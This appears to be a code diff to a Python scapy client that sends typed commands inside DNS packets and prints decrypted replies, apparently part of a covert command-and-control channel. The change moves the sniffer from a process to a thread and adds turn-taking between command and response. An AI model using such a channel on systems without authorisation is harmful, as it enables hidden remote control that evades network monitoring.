@@ -5,7 +5,7 @@ from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP
 from scapy.all import sniff, send
 from scapy.volatile import RandShort
-from multiprocessing import Process
+from threading import Thread
 
 
 
@@ -20,17 +20,23 @@ class Client:
         self.flag_begin = "****["
         self.flag_close = "]****"
         self.port = 8888
+        self.check = True
 
 
     def start(self):
-        self.create_process()
+        self.create_thread()
         self.get_input()
 
     def get_input(self):
         while True:
-            cmd = input("Enter command:")
-            msg = self.prepare_msg(cmd)
-            self.craft_packet(msg)
+            if self.check:
+                cmd = input("Enter command:")
+                self.set_check()
+                msg = self.prepare_msg(cmd)
+                self.craft_packet(msg)
+
+    def set_check(self):
+        self.check = not self.check
 
 
     def prepare_msg(self, cmd: str) -> str:
@@ -46,8 +52,8 @@ class Client:
         print("--------------------------------------------------------------")
         return msg
 
-    def create_process(self):
-        x = Process(target=self.sniff_init)
+    def create_thread(self):
+        x = Thread(target=self.sniff_init)
         x.start()
 
 
@@ -61,8 +67,10 @@ class Client:
     def process_packets(self, msg: str):
         stripped_msg = msg.strip(self.flag_begin).rstrip(self.flag_close)
         decrypted_msg = self.decrypt_data(stripped_msg)
-        output = f"\nCommand Response:\n {decrypted_msg}"
-        print(f"\u001B[s\u001B[A\u001B[999D\u001B[S\u001B[L{output}\u001B[u", end="", flush=True)
+        print(f"{decrypted_msg}")
+        self.set_check()
+
+
 
 
 
